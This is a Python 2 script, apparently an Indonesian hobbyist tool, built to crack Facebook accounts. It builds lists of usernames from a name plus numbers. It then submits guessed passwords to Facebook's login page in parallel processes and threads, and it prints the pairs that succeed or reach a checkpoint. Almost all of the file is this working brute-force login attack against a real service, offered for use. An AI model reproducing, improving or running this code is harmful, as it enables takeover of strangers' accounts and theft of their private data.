# -*- coding UTF-8 -*-
#  Author : RizalCyberEror404
#  Tools : Geli2 Efbeh
#  Versi : 0.2

from brute import brute
from mechanize import Browser
from multiprocessing.pool import Process, ThreadPool
from useragents import baner, multi_ban, deviv, divev
import os, sys, time, cookielib, mechanize, subprocess
os.system('' if os.name == 'nt' else 'chmod +x *')
multi = []


# dev = Browser()
# cj = cookielib.LWPCookieJar()
# dev.set_handle_robots(False)
# dev.set_handle_redirect(True)
# dev.set_cookiejar(cj)
# dev.set_handle_equiv(True)
# dev.set_handle_referer(True)
# dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
# log = "https://www.facebook.com/login.php?login_attempt=1"
# log1 = "https://m.facebook.com" 
# users = open("user.txt", "r").readlines()
users1 = []
users2 = []
users3 = []
users4 = []
users5 = []
users6 = []

def user_dev():
  try:
  	print multi_ban
  	us = raw_input("\033[96;1m {\033[97;1m@\033[96;1m}\033[92;1m Masukkan Nama Facebook, Conth:\033[96;1m lucinta\n\033[97;1m  ==> ")
  	jumlah = input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Jumlah User Yg Mau Di Crack\033[96;1m (Max=5000):\n\033[93;1m  ==> ")
  	san_dev = raw_input("\n\033[96;1m\033[96;1m {\033[97;1m$\033[96;1m}\033[92;1m Sandi Yg Munkin Digunkn, conth:\033[96;1m lucinta123\n\033[97;1m  ==> ")
  	# set password
  	if us == '' or us == ' ' or san_dev == '' or san_dev == ' ':
  		exit('\n \033[91;1m Jangan Kosong Lah Kamprett.. \n')
  	print '\n\033[95;1m<<\033[96;1m Proses Cracking Sedang Berjalan,Tunggu Ajh!\033[95;1m >> \n'
  	sandi1 = san_dev.replace(' ', '\n').replace(',', '\n').replace('/', '\n')
  	sandi = sandi1.replace('\n\n', '\n')
  	# set usernmae
  	userz = us.replace(' ', '.')
  	p = open("pass.txt", "w")
  	p.write(sandi)
  	p.close()
	bag = jumlah / 6 + 1
	bag1 = jumlah / 3 + 1
	bag2 = jumlah / 2 + 1
	bag3 = jumlah / 2 + bag
	bag4 = jumlah / 2 + bag1
	
	for dev in range(1, bag):
		users1.append(userz+'.'+str(dev))
	
	for dev in range(bag, bag1):
		users2.append(userz+'.'+str(dev))
	
	for dev in range(bag1, bag2):
		users3.append(userz+'.'+str(dev))
	
	for dev in range(bag2, bag3):
		users4.append(userz+'.'+str(dev))
	
	for dev in range(bag3, bag4):
		users5.append(userz+'.'+str(dev))
	
	for dev in range(bag4, jumlah+1):
		users6.append(userz+'.'+str(dev))
		
  except KeyboardInterrupt: 
  	exit("\033[91;1m \n Keluar... \n")
  except NameError:
  	exit('\n\033[91;1m Masukkan Angka Dodoll..\n')
  except SyntaxError:
	exit('\n\033[91;1m Masukkan Angka Dodoll..\n ')
def pro_dev(ival):
	pas = open("pass.txt", "r").readlines()
	iqbal = ival.replace('\n', '')
	for iq in pas:
	  try:
		iqu = iq.replace('\n', '').replace('\n\n', '') # print str(iqbal) + " | " + iqu 

		log = 'https://www.facebook.com/login.php'
		dev = mechanize.Browser()
		dev.set_handle_robots(False)
		dev.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
		dev.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36')]
		dev.open(log)
		dev.select_form(nr=0)
		dev.form['email'] = ival
		dev.form['pass'] = iqu
		sub = dev.submit()
		mask = sub.geturl()
		if log != mask and not 'login_attempt' in mask and not 'checkpoint' in mask:
			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[97;1m '+ iqu
		elif 'checkpoint' in mask: 
			print "\033[96;1m  [\033[92;1mSUC\033[96;1m] " +'\033[97;1m'+ iqbal + '\033[96;1m |\033[92;1m '+ iqu
		else:
			pass
	  except:
	  	pass


# def dev_id():
# 	for dev in users:
# 		pro = Process(target=pro_dev, args=(dev,))
# 		multi.append(pro)
# 		pro.start()

# 	for dev in multi:
# 		dev.join()
nom = 5
def dev_id1():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users1)

def dev_id2():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users2)
	
def dev_id3():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users3)

def dev_id4():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users4)

def dev_id5():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users5)
	
def dev_id6():
	dev = ThreadPool(nom)
	dev.map(pro_dev, users6)

def run():
	t1 = Process(target=dev_id1)
	t2 = Process(target=dev_id2)
	t3 = Process(target=dev_id3)
	t4 = Process(target=dev_id4)
	t5 = Process(target=dev_id5)
	t6 = Process(target=dev_id6)
	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t1.join()
	t2.join()
	t3.join()
	t4.join()
	t5.join()
	t6.join()
	divev()
	deviv()
	print "\n\033[97;1m     ==[ \033[96;1m Selesai......\033[97;1m  ]== \n"
	
if __name__ == '__main__':
	try:
		os.system('cls' if os.name == 'nt' else 'clear')
		print baner
		pil = raw_input("\033[96;1m {\033[95;1m?\033[96;1m}\033[92;1m Pilih Opsi\033[93;1m : ")
		if pil == '1':
			brute()
		elif pil == '2':
			user_dev()
			run()
		elif pil == '3':
			try:
				print " \n\n \033[97;1m        +++[ \033[96;1m Tools Versi 0.2 \033[97;1m ]+++" 
				print " \n               \033[93;1m Keunggulan:\n\n   \033[97;1m   Lebih Power Full dibanding yg V.01 \n      bisa mengisi lebih dari 1 password  \n"
				print " \n\033[95;1m   Silahkan Ikuti Instagram saya \033[96;1m(rizalap16)"
				raw_input(" \033[97;1m    Tekan Enter Untuk Membuka Instagram..")
				subprocess.check_output(['am', 'start', 'https://www.instagram.com/rizalap16/'])
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
			except KeyboardInterrupt:
				subprocess.check_output(['am', 'start', 'https://www.instagram.com/rizalap16/'])
				os.system('multi_dev.py' if os.name == 'nt' else 'python2 multi_dev.py')
		else:
			print "\n\033[90;1m Pilih yang Bener lah Kampprett.. "
	except KeyboardInterrupt:
		exit("\n\033[90;1m Keluar... ")
